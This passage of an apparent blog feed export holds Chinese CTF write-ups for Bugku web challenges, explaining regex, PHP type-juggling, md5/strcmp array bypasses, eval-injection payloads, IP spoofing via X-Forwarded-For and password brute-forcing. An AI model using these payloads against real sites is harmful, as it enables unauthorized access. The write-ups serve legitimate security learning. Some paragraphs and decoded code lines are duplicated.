<br>highlight_file(<span class="hljs-string">&#x27;2.php&#x27;</span>);<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;flag&#123;********************************&#125;&#x27;</span>;<br><span class="hljs-variable">$IM</span>= preg_match(<span class="hljs-string">&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;</span>, trim(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>]), <span class="hljs-variable">$match</span>);<br><span class="hljs-keyword">if</span>( <span class="hljs-variable">$IM</span> )&#123; <br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;key is: &#x27;</span>.<span class="hljs-variable">$key</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>一开始看到源码中提示了一个文件2.php，切换到这个文件，会发现返回的页面依旧是这个页面，没办法，那就看看源码</p><p>源码中给$key赋值了flag，并在下面的if判断中利用die函数输出了这个值，那么我们现在的目标就是让下面这个if判断成立，要成立就要$IM为真，此处$IM为preg_match函数的一个返回值，这个函数是判断搜索第二个参数与第一个参数的一个正则匹配，即第二个参数<code>trim($_GET[&quot;id&quot;])</code>中是否存在第一个参数<code>&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;</code>，如果存在返回true，不存在返回false</p><p>解释一下这个参数中涉及到的一些符号</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs lua">. 为通配符，表示一个任意非\n和\r单字符<br><br>.*为字符串通配符，详情可百度<span class="hljs-string">&quot;贪婪匹配&quot;</span><br><br>\为转义符<br><br>[a-z]为任意小写字母<br><br><span class="hljs-string">[[:punct:]]</span>为任意符号<br><br>/i为不区分大小写<br><br>()标记一个子表达式的开始和结束位置，此处不用理会<br></code></pre></td></tr></table></figure><p>最后得到payload: ?id=keyakeyaaaakey:/a/akeya?</p><p>成功拿到flag</p><p><img src="https://img-blog.csdnimg.cn/20210425102656753.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center"></p><h4 id="web24："><a href="#web24：" class="headerlink" title="web24："></a>web24：</h4><p>点开题目之后，是一大段文字，讲了个小段子，玩了一下php的梗</p><p><img src="https://img-blog.csdnimg.cn/20210425102715155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center"></p><p>查看页面源码，发现给了一个链接</p><p><img src="https://img-blog.csdnimg.cn/20210425102735413.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center"></p><p>点击进去，这个txt给了一段源码</p><p><img src="https://img-blog.csdnimg.cn/20210425102757162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-variable">$v3</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$v1</span> != <span class="hljs-variable">$v2</span> &amp;&amp; md5(<span class="hljs-variable">$v1</span>) == md5(<span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">if</span>(!strcmp(<span class="hljs-variable">$v3</span>, <span class="hljs-variable">$flag</span>))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>看了源码之后，会发现这题和前面的web16很像，都是既要md5值相等，又要原值不相等</p><p>有两个思路，一是利用md5()函数对数组不起效，将两个变量以数组形式输入，这样两个md5()都返回null，满足相等条件</p><p>二是利用php在处理长的字符串时会转换成科学计数法，我们可以找两个md5值是0e开头的，它在解析时会当做0的xx次方，都是0，满足条件</p><p>这里还多出来一个strcmp函数，这个函数的作用是比较两个字符串，且只有两个字符串相等时，才会返回0，这里利用strcmp对数组不起作用，直接返回0来绕过</p><p>构造payload：?v1[]=1&amp;v2[]=2&amp;v3[]=1</p><p>得到flag</p><p>看了源码之后，会发现这题和前面的web16很像，都是既要md5值相等，又要原值不相等</p><p>有两个思路，一是利用md5()函数对数组不起效，将两个变量以数组形式输入，这样两个md5()都返回null，满足相等条件</p><p>二是利用php在处理长的字符串时会转换成科学计数法，我们可以找两个md5值是0e开头的，它在解析时会当做0的xx次方，都是0，满足条件</p><p>这里还多出来一个strcmp函数，这个函数的作用是比较两个字符串，且只有两个字符串相等时，才会返回0，这里利用strcmp对数组不起作用，直接返回0来绕过</p><p>构造payload：?v1[]=1&amp;v2[]=2&amp;v3[]=1</p><p>得到flag</p><p><img src="https://img-blog.csdnimg.cn/20210425102911912.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center"></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bugku web总结_1</title>
    <link href="/2021/05/13/bugku%20web%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93_1/"/>
    <url>/2021/05/13/bugku%20web%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93_1/</url>
    
    <content type="html"><![CDATA[<p>﻿## bugku web总结(1-12)</p><p>因为报名了今年的iscc，之前没怎么打过ctf，所以在四月份做了一部分题目，练习一下，这篇文章做一下总结</p><h4 id="web1："><a href="#web1：" class="headerlink" title="web1："></a>web1：</h4><p>ctrl+u，查看页面源码，直接能看到flag，没啥好说的</p><h4 id="web2："><a href="#web2：" class="headerlink" title="web2："></a>web2：</h4><p>让你做三位的算数题，但是答案只让你填一位，好在是前端验证，我们可以直接改，f12打开控制台，源码里有个maxlength变量，初始值设了个1，我们改成3，就可以正常输入了，输入正确答案，flag就有了</p><h4 id="web3："><a href="#web3：" class="headerlink" title="web3："></a>web3：</h4><p>打开之后，给了一串源码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$what</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;what&#x27;</span>]; <span class="hljs-regexp">//</span>接受post过来的参数what，存到what里 <br>echo <span class="hljs-variable">$what</span>;     <span class="hljs-regexp">//</span>打印 <br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$what</span>==<span class="hljs-string">&#x27;flag&#x27;</span>)     <span class="hljs-regexp">//</span>如果值是flag <br>echo <span class="hljs-string">&#x27;flag&#123;****&#125;&#x27;</span>;<span class="hljs-regexp">//</span>    打印flag<br></code></pre></td></tr></table></figure><p>让我们GET传一个what参数，内容是flag的话，就告诉我们flag</p><h4 id="web4："><a href="#web4：" class="headerlink" title="web4："></a>web4：</h4><p>与web3几乎完全相同，只是改成了post传参，打开hackbar，给一个post参数what=flag，拿到flag</p><h4 id="web5："><a href="#web5：" class="headerlink" title="web5："></a>web5：</h4><p>同样是给了一串源码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$num</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];  <span class="hljs-regexp">//g</span>et传参<br><span class="hljs-keyword">if</span>(!is_numeric(<span class="hljs-variable">$num</span>))    <span class="hljs-regexp">//i</span>s_numeric()函数判断参数是否为数字或数字字符串，如果是，返回ture<br>&#123;<br>echo <span class="hljs-variable">$num</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">1</span>)                <span class="hljs-regexp">//</span>如果变量<span class="hljs-variable">$num</span>为<span class="hljs-number">1</span>，打印flag<br>echo <span class="hljs-string">&#x27;flag&#123;**********&#125;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>乍一看两次判断相悖，第一次要求num不是数字或数字字符串，第二次要求num=1，但细看的话，实际上两次判断并不相悖，第一次判断，我们传递的只要不是纯数字，就可以通过，第二次判断，$num==1，php是弱类型语言，数字和字符(串)的比较是存在类型转换的，对字符串来说是以开头的数字为准，所以在松散比较中，1”qid#@# ==1 是正确的，此处如果= =换成= = =，大概就不行了</p><p>下面是两个有关强弱类型和php语言的网站</p><p><a href="https://www.zhihu.com/question/19918532">https://www.zhihu.com/question/19918532</a><br><a href="https://www.php.net/manual/zh/types.comparisons.php">https://www.php.net/manual/zh/types.comparisons.php</a></p><h4 id="web6："><a href="#web6：" class="headerlink" title="web6："></a>web6：</h4><p>一直弹窗，flag就在这里，当然知道flag在这里，不然我花金币进来干嘛，用火狐的话，会有个选项直接不让他弹窗，我们也可以用burp把这个页面拦下来，repeater给它重发一下，burp内嵌的页面显示可不会弹窗，直接查看响应报文，给了一行注释，内容是</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-symbol">&amp;#75;</span><span class="hljs-symbol">&amp;#69;</span><span class="hljs-symbol">&amp;#89;</span><span class="hljs-symbol">&amp;#123;</span><span class="hljs-symbol">&amp;#74;</span><span class="hljs-symbol">&amp;#50;</span><span class="hljs-symbol">&amp;#115;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#52;</span><span class="hljs-symbol">&amp;#50;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#104;</span><span class="hljs-symbol">&amp;#74;</span><span class="hljs-symbol">&amp;#75;</span><span class="hljs-symbol">&amp;#45;</span><span class="hljs-symbol">&amp;#72;</span><span class="hljs-symbol">&amp;#83;</span><span class="hljs-symbol">&amp;#49;</span><span class="hljs-symbol">&amp;#49;</span><span class="hljs-symbol">&amp;#73;</span><span class="hljs-symbol">&amp;#73;</span><span class="hljs-symbol">&amp;#73;</span><span class="hljs-symbol">&amp;#125;</span><br></code></pre></td></tr></table></figure><p>用burp给它html解码，得到flag</p><h4 id="web7："><a href="#web7：" class="headerlink" title="web7："></a>web7：</h4><p>你必须让它停下，定期刷新，大概一秒刷一次，题目告诉我们在熊猫图片停下，结果图还刷不出来，burp抓包，送到repeater，反复的发送，然后看响应报文，刷到某张图片的时候就能看到flag</p><p><img src="https://img-blog.csdnimg.cn/20210416163229331.png#pic_center"></p><h4 id="web8："><a href="#web8：" class="headerlink" title="web8："></a>web8：</h4><p>题目叫文件包含，点进去给了一串源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>; <span class="hljs-comment">//flag在flag.php里</span><br>    <span class="hljs-variable">$a</span> = @<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;hello&#x27;</span>];  <span class="hljs-comment">//request方式接收参数hello</span><br>    <span class="hljs-keyword">eval</span>( <span class="hljs-string">&quot;var_dump(<span class="hljs-subst">$a</span>);&quot;</span>);    <span class="hljs-comment">//eval将参数视为php语句执行，var_dump输出参数值，并返回参数的数据类型</span><br>    show_source(<span class="hljs-keyword">__FILE__</span>);     <span class="hljs-comment">//show_source将文字增亮显示，__file__代表当前文件</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>题目已经告诉了我们需要包含flag.php，另外已经知道参数为hello，另外还有eval函数可以将括号内的内容当做代码执行，所以此时我们直接构造payload为?hello=show_source(‘flag.php’)，读取flag.php中的内容，此处不一定要利用show_source函数，其他读取函数例如print_r也可以</p><h4 id="web9："><a href="#web9：" class="headerlink" title="web9："></a>web9：</h4><p>点进去之后同样是给了一串代码，还提示我们flag在变量中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">flag In the variable ! <span class="hljs-meta">&lt;?php</span>  <br><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag1.php&quot;</span>;    <span class="hljs-comment">//flag</span><br>highlight_file(<span class="hljs-keyword">__file__</span>);   <span class="hljs-comment">//高亮显示</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;args&#x27;</span>]))&#123;   <span class="hljs-comment">//isset检查参数是否设置，如设置且不为空，则返回ture，否则返回false</span><br>    <span class="hljs-variable">$args</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;args&#x27;</span>];   <span class="hljs-comment">//GET方式传参args,放入变量$args</span><br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/^\w+$/&quot;</span>,<span class="hljs-variable">$args</span>))&#123;    <span class="hljs-comment">//执行正则表达式匹配,/^开始符，\w表示单词字符，即大小写字//母和数字0-9，+代表多次匹配，$/结束。后面的args变量是被匹//配的。相当于在args变量里寻找符合正则表达式的部分，若有则返回1，若没有则返回0</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;args error!&quot;</span>);   <span class="hljs-comment">//输出args error，并退出当前脚本</span><br>    &#125;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;var_dump($<span class="hljs-subst">$args</span>);&quot;</span>);  <span class="hljs-comment">//同web8</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>很显然，这里跟web8最大的不同是，由于preg_match匹配全字母及数字0-9，我们很显然没法直接用web8那样的方法包含文件名flag1.php，而且我们也用不了像show_source()，因为里面包含符号，但开头提示了我们flag在变量中，可能他定义了某些变量中含有flag1.php，我们此时需要利用到超全局变量$GLOBALS，他会引用全局作用域中可用的全部变量，所以我们只需要构造payload为/?args=GLOBALS即可获取flag。</p><h4 id="web10："><a href="#web10：" class="headerlink" title="web10："></a>web10：</h4><p>头等舱，点开之后，什么也没有</p><p><img src="https://img-blog.csdnimg.cn/20210416163255318.png#pic_center"></p><p>f12打开控制台，看下head，或者burp抓包扔给repeater，再发一下，看响应，就能看到flag了。</p><h4 id="web11："><a href="#web11：" class="headerlink" title="web11："></a>web11：</h4><p>点开以后是个黑页</p><p><img src="https://img-blog.csdnimg.cn/20210416163324261.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center"></p><p>使用dirsearch扫过之后，会拿到一个/shell.php页面，让输密码</p><p><img src="https://img-blog.csdnimg.cn/20210416163359756.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center"></p><p>打开burp，抓包丢给intruder模块，选用burp自带的密码集，爆破即可</p><h4 id="web12："><a href="#web12：" class="headerlink" title="web12："></a>web12：</h4><p>点开之后，给了一个登录框</p><p><img src="https://img-blog.csdnimg.cn/20210416163926991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center"></p><p>f12打开控制台，查看源码</p><p><img src="https://img-blog.csdnimg.cn/202104161639475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center"></p><p>注释的内容是一段base64加密文本dGVzdDEyMw==，解密后得到test123，估计是密码</p><p>burp丢给intruder，爆破用户名，会提示ip禁止访问</p><p><img src="https://img-blog.csdnimg.cn/20210416164004514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center"></p><p>可以xff修改ip访问，在报文中加入X-Forwarded-For: 127.0.0.1，再次爆破可以得到用户名为admin，输入用户名密码，得到flag</p><h4 id="web13："><a href="#web13：" class="headerlink" title="web13："></a>web13：</h4><p>点开之后，给了一个输入框，还提示看看源代码，右键查看源码</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm"> <br>var p<span class="hljs-number">1</span> <span class="hljs-operator">=</span> &#x27;<span class="hljs-variable">%66</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%63</span><span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%20</span><span class="hljs-variable">%63</span><span class="hljs-variable">%68</span><span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>b<span class="hljs-variable">%53</span><span class="hljs-variable">%75</span><span class="hljs-variable">%62</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%69</span><span class="hljs-variable">%74</span><span class="hljs-variable">%28</span><span class="hljs-variable">%29</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%20</span><span class="hljs-variable">%61</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%64</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%67</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%45</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%42</span><span class="hljs-variable">%79</span><span class="hljs-variable">%49</span><span class="hljs-variable">%64</span><span class="hljs-variable">%28</span><span class="hljs-variable">%22</span><span class="hljs-variable">%70</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%77</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%64</span><span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%69</span><span class="hljs-variable">%66</span><span class="hljs-variable">%28</span><span class="hljs-variable">%22</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%65</span><span class="hljs-variable">%64</span><span class="hljs-variable">%22</span><span class="hljs-variable">%21</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%74</span><span class="hljs-variable">%79</span><span class="hljs-variable">%70</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%66</span><span class="hljs-variable">%20</span><span class="hljs-variable">%61</span><span class="hljs-variable">%29</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%69</span><span class="hljs-variable">%66</span><span class="hljs-variable">%28</span><span class="hljs-variable">%22</span><span class="hljs-variable">%36</span><span class="hljs-variable">%37</span><span class="hljs-variable">%64</span><span class="hljs-variable">%37</span><span class="hljs-variable">%30</span><span class="hljs-variable">%39</span><span class="hljs-variable">%62</span><span class="hljs-variable">%32</span><span class="hljs-variable">%62</span>&#x27;<span class="hljs-comment">;</span><br>var p<span class="hljs-number">2</span> <span class="hljs-operator">=</span> &#x27;<span class="hljs-variable">%61</span><span class="hljs-variable">%61</span><span class="hljs-variable">%36</span><span class="hljs-variable">%34</span><span class="hljs-variable">%38</span><span class="hljs-variable">%63</span><span class="hljs-variable">%66</span><span class="hljs-variable">%36</span><span class="hljs-variable">%65</span><span class="hljs-variable">%38</span><span class="hljs-variable">%37</span><span class="hljs-variable">%61</span><span class="hljs-variable">%37</span><span class="hljs-variable">%31</span><span class="hljs-variable">%31</span><span class="hljs-variable">%34</span><span class="hljs-variable">%66</span><span class="hljs-variable">%31</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%3</span>d<span class="hljs-variable">%61</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%75</span><span class="hljs-variable">%65</span><span class="hljs-variable">%29</span><span class="hljs-variable">%72</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%75</span><span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%21</span><span class="hljs-variable">%30</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%74</span><span class="hljs-variable">%28</span><span class="hljs-variable">%22</span><span class="hljs-variable">%45</span><span class="hljs-variable">%72</span><span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%61</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%75</span><span class="hljs-variable">%73</span><span class="hljs-variable">%28</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%75</span><span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%21</span><span class="hljs-variable">%31</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%7</span>d<span class="hljs-variable">%64</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%67</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%45</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%42</span><span class="hljs-variable">%79</span><span class="hljs-variable">%49</span><span class="hljs-variable">%64</span><span class="hljs-variable">%28</span><span class="hljs-variable">%22</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-variable">%76</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%51</span><span class="hljs-variable">%75</span><span class="hljs-variable">%65</span><span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%73</span><span class="hljs-variable">%75</span><span class="hljs-variable">%62</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%69</span><span class="hljs-variable">%74</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%63</span><span class="hljs-variable">%68</span><span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>b<span class="hljs-variable">%53</span><span class="hljs-variable">%75</span><span class="hljs-variable">%62</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%69</span><span class="hljs-variable">%74</span><span class="hljs-variable">%3</span>b&#x27;<span class="hljs-comment">;</span><br>eval(unescape(p<span class="hljs-number">1</span>) + unescape(&#x27;<span class="hljs-variable">%35</span><span class="hljs-variable">%34</span><span class="hljs-variable">%61</span><span class="hljs-variable">%61</span><span class="hljs-variable">%32</span>&#x27; + p<span class="hljs-number">2</span>))<span class="hljs-comment">;  //将p1和p2拼接后作为php语句执行</span><br></code></pre></td></tr></table></figure><p>经过url解码，得到如下代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkSubmit</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">var</span> a=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;password&quot;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;undefined&quot;</span>!=<span class="hljs-keyword">typeof</span> a)&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;</span>==a.value)<br>            <span class="hljs-keyword">return</span>!<span class="hljs-number">0</span>;           <span class="hljs-comment">//如果我们传入的passwd参数等于这一串，返回1</span><br>        alert(<span class="hljs-string">&quot;Error&quot;</span>);<br>        a.focus();<br>        <span class="hljs-keyword">return</span>!<span class="hljs-number">1</span><br>    &#125;<br>&#125;<br><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;levelQuest&quot;</span>).onsubmit=checkSubmit;<br><span class="hljs-comment">//如果我们传入的passwd参数等于这一串，返回1</span><br>        alert(<span class="hljs-string">&quot;Error&quot;</span>);<br>        a.focus();<br>        <span class="hljs-keyword">return</span>!<span class="hljs-number">1</span><br>    &#125;<br>&#125;<br><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;levelQuest&quot;</span>).onsubmit=checkSubmit;<br></code></pre></td></tr></table></figure><p>很显然，要两个if全部通过，才能拿到flag，我们把67d709b2b54aa2aa648cf6e87a7114f1复制到输入框，成功拿到flag</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cybox1.1靶机练习</title>
    <link href="/2021/05/09/cybox1-1%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/"/>
    <url>/2021/05/09/cybox1-1%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/</url>
    
